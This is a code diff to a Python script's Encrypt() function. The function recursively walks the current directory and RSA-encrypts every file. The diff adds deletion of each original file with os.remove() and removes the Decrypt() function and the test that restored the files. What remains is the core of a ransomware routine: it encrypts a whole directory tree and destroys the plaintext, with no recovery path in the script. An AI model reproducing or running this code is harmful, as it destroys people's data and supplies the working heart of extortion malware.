@@ -9,7 +9,7 @@ def Encrypt():
 
     cwd = os.getcwd()
 
-    filenames = []
+    fileInfo = []
 
     # traverse root directory, and list directories as dirs and files as files
     for root, dirs, files in os.walk("."):
@@ -22,21 +22,9 @@ def Encrypt():
         
         for file in files:
             filepath = pathToFile + "\\" + file
-            filename = MyRSAEncrypt(filepath, RSA_PUBLIC_KEY_FILEPATH)
-            filenames.append(filename)
+            pathToFile, filename = MyRSAEncrypt(filepath, RSA_PUBLIC_KEY_FILEPATH)
+            fileInfo.append([pathToFile, filename])
+            os.remove(pathToFile + "\\" + file)
 
-    return filenames
-
-def Decrypt(filenames):
-    for filename in filenames:
-        MyRSADecrypt(filename, RSA_PRIVATE_KEY_FILEPATH)
-            
+    return fileInfo
     
-
-# =====================
-# TEST
-# =====================
-
-if __name__ == "__main__":
-    filenames = Encrypt()
-    Decrypt(filenames)
